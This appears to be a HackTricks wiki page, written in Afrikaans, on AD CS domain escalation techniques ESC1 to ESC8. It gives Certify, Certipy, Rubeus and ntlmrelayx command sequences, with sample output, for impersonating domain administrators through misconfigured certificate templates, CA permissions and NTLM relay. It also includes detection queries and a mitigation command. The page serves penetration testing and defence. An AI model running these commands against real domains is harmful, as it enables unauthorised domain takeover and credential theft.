# AD CS Domein Escalasie

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**Dit is 'n opsomming van die eskalasie-tegniekafdelings van die poste:**

* [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified\_Pre-Owned.pdf)
* [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
* [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Verkeerd Geconfigureerde Sertifikaatsjablone - ESC1

### Verduideliking

### Verkeerd Geconfigureerde Sertifikaatsjablone - ESC1 Verduidelik

* **Inskrywingsregte word aan lae-gepriviligeerde gebruikers toegeken deur die Enterprise CA.**
* **Goedkeuring deur bestuurder is nie nodig nie.**
* **Geen handtekeninge van gemagtigde personeel is nodig nie.**
* **Sekuriteitsbeskrywings op sertifikaatsjablone is oormatig toegeeflik, wat lae-gepriviligeerde gebruikers toelaat om inskrywingsregte te verkry.**
* **Sertifikaatsjablone is gekonfigureer om EKU's te definieer wat outentifikasie fasiliteer:**
* Uitgebreide Sleutelgebruik (EKU) identifiseerders soos Kliëntoutentifikasie (OID 1.3.6.1.5.5.7.3.2), PKINIT Kliëntoutentifikasie (1.3.6.1.5.2.3.4), Slimkaart Aanmelding (OID 1.3.6.1.4.1.311.20.2.2), Enige Doel (OID 2.5.29.37.0), of geen EKU (SubCA) is ingesluit.
* **Die vermoë vir aanvragers om 'n subjectAltName in die Sertifikaatondertekeningsaanvraag (CSR) in te sluit, word deur die sjabloon toegelaat:**
* Die Aktiewe Gids (AD) prioritiseer die subjectAltName (SAN) in 'n sertifikaat vir identiteitsverifikasie indien teenwoordig. Dit beteken dat deur die spesifisering van die SAN in 'n CSR, 'n sertifikaat aangevra kan word om enige gebruiker te impersoneer (bv. 'n domein-administrateur). Of 'n SAN deur die aanvrager gespesifiseer kan word, word aangedui in die AD-objek van die sertifikaatsjabloon deur die `mspki-certificate-name-flag` eienskap. Hierdie eienskap is 'n bitmasker, en die teenwoordigheid van die `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` vlag maak die spesifisering van die SAN deur die aanvrager moontlik.

{% hint style="danger" %}
Die konfigurasie wat beskryf word, maak dit vir lae-gepriviligeerde gebruikers moontlik om sertifikate met enige SAN van keuse aan te vra, wat outentifikasie as enige domeinprinsipaal deur Kerberos of SChannel moontlik maak.
{% endhint %}

Hierdie kenmerk word soms geaktiveer om die aan-die-gang-generering van HTTPS- of gasheersertifikate deur produkte of implementeringsdienste te ondersteun, of as gevolg van 'n gebrek aan begrip.

Dit word opgemerk dat die skep van 'n sertifikaat met hierdie opsie 'n waarskuwing ontlok, wat nie die geval is wanneer 'n bestaande sertifikaatsjabloon (soos die `WebServer`-sjabloon, wat `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` geaktiveer het) gedupliseer en dan gewysig word om 'n outentiserings-OID in te sluit.

### Misbruik

Om **kwesbare sertifikaatsjablone te vind** kan jy hardloop:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
Om **misbruik te maak van hierdie kwesbaarheid om as 'n administrateur op te tree** kan 'n persoon die volgende hardloop:
```bash
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
```
Dan kan jy die gegenereerde **sertifikaat na `.pfx`-formaat omskep** en dit gebruik om weer te **verifieer met Rubeus of certipy**:
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Die Windows-binêre lêers "Certreq.exe" & "Certutil.exe" kan gebruik word om die PFX te genereer: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

Die enumerasie van sertifikaatsjablone binne die AD Bos se konfigurasieskema, spesifiek dié wat nie goedkeuring of handtekeninge vereis nie, wat 'n Kliëntverifikasie of Slimkaart Aantekenings EKU besit, en met die `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` vlag geaktiveer, kan uitgevoer word deur die volgende LDAP-navraag te hardloop:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## Verkeerd geconfigureerde Sertifikaatsjablone - ESC2

### Verduideliking

Die tweede misbruikscenario is 'n variasie van die eerste:

1. Inschrywingsregte word aan lae-gepriviligeerde gebruikers verleen deur die Ondernemings-CA.
2. Die vereiste vir bestuurdergoedkeuring is gedeaktiveer.
3. Die behoefte aan gemagtigde handtekeninge word weggelaat.
4. 'n Oormatig toegeeflike sekuriteitsbeskrywing op die sertifikaatsjabloon verleen sertifikaatinskrywingsregte aan lae-gepriviligeerde gebruikers.
5. **Die sertifikaatsjabloon is omskryf om die Any Purpose EKU of geen EKU in te sluit.**

Die **Any Purpose EKU** maak dit moontlik vir 'n sertifikaat om deur 'n aanvaller vir **enige doel** verkry te word, insluitend klientverifikasie, bedienerverifikasie, kodesondertekening, ens. Dieselfde **tegniek wat vir ESC3 gebruik word** kan gebruik word om van hierdie scenario misbruik te maak.

Sertifikate met **geen EKUs**, wat as ondergeskikte CA-sertifikate optree, kan misbruik word vir **enige doel** en kan ook gebruik word om nuwe sertifikate te onderteken. Dus kan 'n aanvaller arbitrêre EKUs of velde spesifiseer in die nuwe sertifikate deur 'n ondergeskikte CA-sertifikaat te gebruik.

Nietemin sal nuwe sertifikate wat geskep is vir **domeinverifikasie** nie funksioneer as die ondergeskikte CA nie vertrou word deur die **`NTAuthCertificates`**-voorwerp nie, wat die verstekinstelling is. Nietemin kan 'n aanvaller steeds **nuwe sertifikate met enige EKU** en arbitrêre sertifikaatwaardes skep. Hierdie kan potensieel **misbruik** word vir 'n wye verskeidenheid doeleindes (bv., kodesondertekening, bedienerverifikasie, ens.) en kan beduidende implikasies hê vir ander toepassings in die netwerk soos SAML, AD FS, of IPSec.

Om sjablone wat aan hierdie scenario binne die AD-bos se konfigurasieskema voldoen, op te som, kan die volgende LDAP-navraag uitgevoer word:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Verkeerd Geconfigureerde Inschrijvingsagent-sjablone - ESC3

### Verduideliking

Hierdie scenario is soos die eerste en tweede een, maar **misbruik** 'n **verskillende EKU** (Sertifikaataanvraagagent) en **2 verskillende sjablone** (daarom het dit 2 stelle vereistes),

Die **Sertifikaataanvraagagent EKU** (OID 1.3.6.1.4.1.311.20.2.1), bekend as **Inschrywingsagent** in Microsoft-dokumentasie, maak dit vir 'n hoofmoontlikheid moontlik om vir 'n **sertifikaat in te skryf namens 'n ander gebruiker**.

Die **"inschrywingsagent"** skryf in vir so 'n **sjabloon** en gebruik die resulterende **sertifikaat om 'n CSR mede te onderteken namens die ander gebruiker**. Dit **stuur** dan die **mede-ondertekende CSR** na die CA, skryf in vir 'n **sjabloon** wat **"inskrywing namens" toelaat**, en die CA reageer met 'n **sertifikaat wat aan die "ander" gebruiker behoort**.

**Vereistes 1:**

* Inschrywingsregte word deur die Ondernemings-CA aan lae-gepriviligeerde gebruikers toegeken.
* Die vereiste vir bestuursgoedkeuring word weggelaat.
* Geen vereiste vir gemagtigde handtekeninge nie.
* Die sekuriteitsbeskrywing van die sertifikaatsjabloon is buitensporig toegeeflik, wat inskrywingsregte aan lae-gepriviligeerde gebruikers toeken.
* Die sertifikaatsjabloon sluit die Sertifikaataanvraagagent EKU in, wat die aanvraag van ander sertifikaatsjabbone namens ander hoofmoontlikhede moontlik maak.

**Vereistes 2:**

* Die Ondernemings-CA ken inskrywingsregte toe aan lae-gepriviligeerde gebruikers.
* Bestuursgoedkeuring word omseil.
* Die sjabloon se skemas weergawe is óf 1 óf oorskry 2, en dit spesifiseer 'n Aansoekbeleid Uitreikingsvereiste wat die Sertifikaataanvraagagent EKU vereis.
* 'n EKU wat in die sertifikaatsjabloon gedefinieer is, maak domeinverifikasie moontlik.
* Beperkings vir inskrywingsagente word nie op die CA toegepas nie.

### Misbruik

Jy kan [**Certify**](https://github.com/GhostPack/Certify) of [**Certipy**](https://github.com/ly4k/Certipy) gebruik om hierdie scenario te misbruik:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
Die **gebruikers** wat toegelaat word om 'n **enrollment agent sertifikaat** te **verkry**, die templaat waarin enrollment **agents** toegelaat word om in te skryf, en die **rekeninge** namens wie die enrollment agent mag optree kan beperk word deur ondernemings CAs. Dit word bereik deur die `certsrc.msc` **snap-in** oop te maak, **regs te klik op die CA**, **Eienskappe** te kies, en dan te **navigeer** na die "Enrollment Agents" lêer.

Dit word egter opgemerk dat die **verstek** instelling vir CAs is om "Moenie enrollment agents beperk nie." Wanneer die beperking op enrollment agents deur administrateurs geaktiveer word, deur dit in te stel op "Beperk enrollment agents," bly die verstek konfigurasie uiters inskiklik. Dit laat **Almal** toe om in te skryf vir alle templaat as enigiemand.

## Kwesbare Sertifikaat Templaat Toegangsbeheer - ESC4

### **Verduideliking**

Die **sekuriteitsbeskrywing** op **sertifikaat templaat** definieer die **toestemmings** wat spesifieke **AD hoofde** het met betrekking tot die templaat.

Indien 'n **aanvaller** die nodige **toestemmings** het om 'n **templaat** te **verander** en enige **uitbuitbare verkeerde konfigurasies** soos uiteengesit in **vorige afdelings** te **instel**, kan voorreg-escalasie gefasiliteer word.

Bekende toestemmings wat van toepassing is op sertifikaat templaat sluit in:

* **Eienaar:** Verleen implisiete beheer oor die objek, wat die verandering van enige eienskappe moontlik maak.
* **VolleBeheer:** Stel volledige gesag oor die objek in, insluitend die vermoë om enige eienskappe te verander.
* **SkryfEienaar:** Laat die verandering van die objek se eienaar toe na 'n hoof onder die aanvaller se beheer.
* **SkryfDacl:** Maak die aanpassing van toegangsbeheer moontlik, wat moontlik 'n aanvaller VolleBeheer kan gee.
* **SkryfEienskap:** Magtig die redigering van enige objek eienskappe.

### Misbruik

'n Voorbeeld van 'n privesc soos die vorige een:

<figure><img src="../../../.gitbook/assets/image (811).png" alt=""><figcaption></figcaption></figure>

ESC4 is wanneer 'n gebruiker skryfregte het oor 'n sertifikaat templaat. Dit kan byvoorbeeld misbruik word om die konfigurasie van die sertifikaat templaat te oorskryf om die templaat kwesbaar te maak vir ESC1.

Soos ons kan sien in die pad hierbo, het slegs `JOHNPC` hierdie regte, maar ons gebruiker `JOHN` het die nuwe `AddKeyCredentialLink` kant na `JOHNPC`. Aangesien hierdie tegniek verband hou met sertifikate, het ek hierdie aanval ook geïmplementeer, wat bekend staan as [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Hier is 'n klein voorskou van Certipy se `shadow auto` bevel om die NT-hash van die slagoffer te herwin.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** kan die konfigurasie van 'n sertifikaatsjabloon oorskryf met 'n enkele bevel. Standaard sal Certipy die konfigurasie oorskryf om dit vatbaar te maak vir ESC1. Ons kan ook die `-save-old` parameter spesifiseer om die ou konfigurasie te stoor, wat nuttig sal wees vir die herstel van die konfigurasie na ons aanval.
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## Kwesbare PKI-voorwerptoegangsbeheer - ESC5

### Verduideliking

Die uitgebreide web van onderling gekoppelde ACL-gebaseerde verhoudings, wat verskeie voorwerpe buite sertifikaatsjablone en die sertifikaatautoriteit insluit, kan die veiligheid van die hele AD CS-stelsel beïnvloed. Hierdie voorwerpe, wat die veiligheid aansienlik kan beïnvloed, behels:

- Die AD-rekenaarvoorwerp van die CA-bediener, wat deur meganismes soos S4U2Self of S4U2Proxy gekompromitteer kan word.
- Die RPC/DCOM-bediener van die CA-bediener.
- Enige afstammeling AD-voorwerp of houer binne die spesifieke houerpad `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`. Hierdie pad sluit houers en voorwerpe in soos die Sertifikaatsjablone-houer, Sertifiseringsowerhede-houer, die NTAuthCertificates-voorwerp, en die Inschrywingsdienshouer.

Die veiligheid van die PKI-stelsel kan gekompromitteer word as 'n lae-bevoorregte aanvaller beheer oor enige van hierdie kritieke komponente verkry.

## EDITF\_ATTRIBUTESUBJECTALTNAME2 - ESC6

### Verduideliking

Die onderwerp wat bespreek word in die [**CQure Academy-pos**](https://cqureacademy.com/blog/enhanced-key-usage) raak ook die implikasies van die **`EDITF_ATTRIBUTESUBJECTALTNAME2`**-vlag aan, soos deur Microsoft uiteengesit. Hierdie konfigurasie, wanneer geaktiveer op 'n Sertifiseringsowerheid (CA), maak die insluiting van **gebruiker-gedefinieerde waardes** in die **alternatiewe naam van die onderwerp** vir **enige versoek** moontlik, insluitend dié wat vanuit Active Directory® saamgestel is. Gevolglik maak hierdie bepaling dit vir 'n **indringer** moontlik om deur **enige sjabloon** wat vir domein **verifikasie** opgestel is, in te skryf—veral dié wat oop is vir **onbevoorregte** gebruikersinskrywing, soos die standaard Gebruikersjabloon. As gevolg hiervan kan 'n sertifikaat beveilig word, wat die indringer in staat stel om as 'n domein-administrateur of **enige ander aktiewe entiteit** binne die domein te verifieer.

**Nota**: Die benadering om **alternatiewe name** in 'n Sertifikaatondertekeningsversoek (CSR) by te voeg, deur die `-attrib "SAN:"`-argument in `certreq.exe` te gebruik (verwys na as "Naamwaardepare"), bied 'n **teenstelling** tot die uitbuitingsstrategie van SANs in ESC1. Hier lê die onderskeid in **hoe rekeninginligting ingekapsel word**—binne 'n sertifikaateienskap eerder as 'n uitbreiding.

### Misbruik

Om te verifieer of die instelling geaktiveer is, kan organisasies die volgende bevel met `certutil.exe` gebruik:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
Hierdie operasie maak in wese gebruik van **afstandbeheer van die register**, dus 'n alternatiewe benadering kan wees:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Hulpmiddels soos [**Certify**](https://github.com/GhostPack/Certify) en [**Certipy**](https://github.com/ly4k/Certipy) is in staat om hierdie wanopset te detecteer en te benut:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
Om hierdie instellings te verander, mits 'n persoon **domain administratiewe** regte het of dieselfde, kan die volgende bevel uitgevoer word vanaf enige werkstasie:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
Om hierdie konfigurasie in jou omgewing uit te skakel, kan die vlag verwyder word met:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
Na die Mei 2022-sekuriteitsopdaterings, sal nuut uitgereikte **sertifikate** 'n **sekuriteitsuitbreiding** bevat wat die **aanvraer se `objectSid` eienskap** inkorporeer. Vir ESC1 word hierdie SID afgelei van die gespesifiseerde SAN. Vir **ESC6** weerspieël die SID egter die **aanvraer se `objectSid`**, nie die SAN nie.\
Om ESC6 te benut, is dit noodsaaklik dat die stelsel vatbaar is vir ESC10 (Swak Sertifikaatafbeeldings), wat die **SAN bo die nuwe sekuriteitsuitbreiding** prioriteer.
{% endhint %}

## Kwesbare Sertifikaatowerheidstoegangsbeheer - ESC7

### Aanval 1

#### Verduideliking

Toegangsbeheer vir 'n sertifikaatowerheid word deur 'n stel toestemmings wat CA-aksies regeer, onderhou. Hierdie toestemmings kan besigtig word deur `certsrv.msc` te benader, 'n CA met die regterknoppie te kliek, eienskappe te kies, en dan na die Sekuriteit-lap te navigeer. Daarbenewens kan toestemmings geënumereer word deur die PSPKI-module te gebruik met opdragte soos:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
Dit bied insigte in die primêre regte, naamlik **`ManageCA`** en **`ManageCertificates`**, wat ooreenstem met die rolle van "CA-administrator" en "Sertifikaatbestuurder" onderskeidelik.

#### Misbruik

Die besit van **`ManageCA`** regte op 'n sertifikaatautoriteit stel die hoof in staat om instellings op afstand te manipuleer deur PSPKI te gebruik. Dit sluit die skakeling van die **`EDITF_ATTRIBUTESUBJECTALTNAME2`** vlag in om SAN-spesifikasie in enige templaat toe te laat, 'n kritieke aspek van domein-escalasie.

Vereenvoudiging van hierdie proses is moontlik deur die gebruik van PSPKI se **Enable-PolicyModuleFlag** cmdlet, wat wysigings sonder direkte GUI-interaksie toelaat.

Die besit van **`ManageCertificates`** regte fasiliteer die goedkeuring van hangende versoek, wat die "CA-sertifikaatbestuurder-goedkeuring" beskerming omseil.

'n Kombinasie van die **Certify** en **PSPKI** modules kan gebruik word om 'n sertifikaat aan te vra, goed te keur, en af te laai:
```powershell
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### Aanval 2

#### Verduideliking

{% hint style="warning" %}
In die **vorige aanval** is die **`Manage CA`**-permissies gebruik om die **EDITF\_ATTRIBUTESUBJECTALTNAME2**-vlag te **aktiveer** om die **ESC6-aanval** uit te voer, maar dit sal geen effek hê totdat die CA-diens (`CertSvc`) herlaai word nie. Wanneer 'n gebruiker die `Manage CA` toegangsreg het, is die gebruiker ook toegelaat om die diens te **herlaai**. Dit beteken egter **nie dat die gebruiker die diens op afstand kan herlaai nie**. Verder mag **ESC6 nie uit die boks werk** in die meeste opgedateerde omgewings as gevolg van die Mei 2022-sekuriteitsopdaterings.
{% endhint %}

Daarom word hierdie aanval voorgestel.

Vereistes:

* Slegs **`ManageCA` toestemming**
* **`Manage Certificates`** toestemming (kan verleen word vanaf **`ManageCA`**)
* Sertifikaatsjabloon **`SubCA`** moet **geaktiveer** wees (kan geaktiveer word vanaf **`ManageCA`**)

Die tegniek berus op die feit dat gebruikers met die `Manage CA` _en_ `Manage Certificates` toegangsreg kan **mislukte sertifikaataanvrae uitreik**. Die **`SubCA`** sertifikaatsjabloon is **kwesbaar vir ESC1**, maar **slegs administrateurs** kan in die sjabloon inskryf. Dus kan 'n **gebruiker** versoek om in die **`SubCA`** in te skryf - wat **geweier** sal word - maar **daarna deur die bestuurder uitgereik** sal word.

#### Misbruik

Jy kan jouself die `Manage Certificates` toegangsreg gee deur jou gebruiker as 'n nuwe amptenaar by te voeg.
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
Die **`SubCA`** templaat kan geaktiveer word op die CA met die `-enable-template` parameter. Standaard is die `SubCA` templaat geaktiveer.
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
Indien ons aan die voorvereistes vir hierdie aanval voldoen het, kan ons begin deur **'n sertifikaat aan te vra gebaseer op die `SubCA` templaat**.

**Hierdie versoek sal geweier word**, maar ons sal die privaatsleutel stoor en die versoek-ID neerskryf.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
Met ons **`Bestuur CA` en `Bestuur Sertifikate`**, kan ons dan die **mislukte sertifikaat versoek** uitreik met die `ca` bevel en die `-issue-request <versoek ID>` parameter.
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
En uiteindelik kan ons die uitgereikte sertifikaat **herwin met die `req` bevel en die `-herwin <versoek ID>` parameter**.
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
## NTLM Relay na AD CS HTTP-eindpunte - ESC8

### Verduideliking

{% hint style="info" %}
In omgewings waar **AD CS geïnstalleer is**, indien 'n **webaanvraag-eindpunt kwesbaar** bestaan en ten minste een **sertifikaatsjabloon gepubliseer is** wat **domeinrekenaarinskrywing en klientverifikasie toelaat** (soos die verstek **`Machine`**-sjabloon), word dit moontlik vir **enige rekenaar met die spooler-diens aktief om deur 'n aanvaller gekompromitteer te word**!
{% endhint %}

Verskeie **HTTP-gebaseerde inskrywingsmetodes** word ondersteun deur AD CS, beskikbaar deur addisionele bedienerrolle wat administrateurs mag installeer. Hierdie koppelvlakke vir HTTP-gebaseerde sertifikaatinskrywing is vatbaar vir **NTLM-relay-aanvalle**. 'n Aanvaller kan vanaf 'n **gekompromitteerde masjien enige AD-rekening naboots wat deur inkomende NTLM geoutentiseer word**. Terwyl die slagofferrekening nageboots word, kan hierdie webkoppelvlakke deur 'n aanvaller benader word om **'n klientverifikasiesertifikaat aan te vra deur die `User` of `Machine`-sertifikaatsjablone**.

* Die **webaanvraagkoppelvlak** (‘n ouer ASP-toepassing beskikbaar by `http://<kaserver>/certsrv/`), verstek na slegs HTTP, wat nie beskerming teen NTLM-relay-aanvalle bied nie. Daarbenewens staan dit uitdruklik slegs NTLM-outentisering toe deur sy Autorisasie-HTTP-kop, wat meer veilige outentiseringsmetodes soos Kerberos ontoepasbaar maak.
* Die **Sertifikaatinskrywingsdiens** (CES), **Sertifikaatinskrywingsbeleid** (CEP) Webdiens, en **Netwerktoestelinskrywingsdiens** (NDES) ondersteun standaard onderhandelingsoutentisering via hul Autorisasie-HTTP-kop. Onderhandelingsoutentisering ondersteun beide Kerberos en **NTLM**, wat 'n aanvaller in staat stel om tydens relay-aanvalle na NTLM af te gradeer. Alhoewel hierdie webdienste standaard HTTPS ondersteun, beskerm HTTPS alleenlik nie teen NTLM-relay-aanvalle nie. Beskerming teen NTLM-relay-aanvalle vir HTTPS-dienste is slegs moontlik wanneer HTTPS gekombineer word met kanaalbinding. Ongelukkig aktiveer AD CS nie Uitgebreide Beskerming vir Outentisering op IIS nie, wat vereis word vir kanaalbinding.

'n Algemene **probleem** met NTLM-relay-aanvalle is die **kort duur van NTLM-sessies** en die onvermoë van die aanvaller om met dienste te interaksieer wat **NTLM-ondertekening vereis**.

Nietemin word hierdie beperking oorkom deur 'n NTLM-relay-aanval te benut om 'n sertifikaat vir die gebruiker te bekom, aangesien die geldigheidsduur van die sertifikaat die sessie se duur bepaal, en die sertifikaat met dienste wat **NTLM-ondertekening voorskryf**, gebruik kan word. Vir instruksies oor die gebruik van 'n gesteelde sertifikaat, verwys na:

{% content-ref url="account-persistence.md" %}
[account-persistence.md](account-persistence.md)
{% endcontent-ref %}

'n Ander beperking van NTLM-relay-aanvalle is dat **'n aanvallerbeheerde masjien deur 'n slagofferrekening geoutentiseer moet word**. Die aanvaller kan óf wag óf probeer om hierdie outentisering **af te dwing**:

{% content-ref url="../printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../printers-spooler-service-abuse.md)
{% endcontent-ref %}

### **Misbruik**

[**Certify**](https://github.com/GhostPack/Certify) se `cas` ondersoek **geaktiveerde HTTP AD CS-eindpunte**:
```
Certify.exe cas
```
<figure><img src="../../../.gitbook/assets/image (69).png" alt=""><figcaption></figcaption></figure>

Die `msPKI-Enrollment-Servers` eiendom word deur ondernemingsertifikaatautoriteite (CAs) gebruik om Sertifikaatinskrywingsdiens (CES) eindpunte te stoor. Hierdie eindpunte kan gepars en gelys word deur die werktuig **Certutil.exe** te gebruik:
```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```
<figure><img src="../../../.gitbook/assets/image (754).png" alt=""><figcaption></figcaption></figure>
```powershell
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```
<figure><img src="../../../.gitbook/assets/image (937).png" alt=""><figcaption></figcaption></figure>

#### Misbruik met Certify
```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```
#### Misbruik met [Certipy](https://github.com/ly4k/Certipy)

Die versoek vir 'n sertifikaat word standaard deur Certipy gemaak op grond van die templaat `Machine` of `User`, bepaal deur of die rekeningnaam wat oorgedra word eindig in `$`. Die spesifikasie van 'n alternatiewe templaat kan bereik word deur die gebruik van die `-template` parameter.

'N Tegniek soos [PetitPotam](https://github.com/ly4k/PetitPotam) kan dan gebruik word om outentisering af te dwing. Wanneer daar met domeinbeheerders gewerk word, is die spesifikasie van `-template DomainController` vereis.
```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```
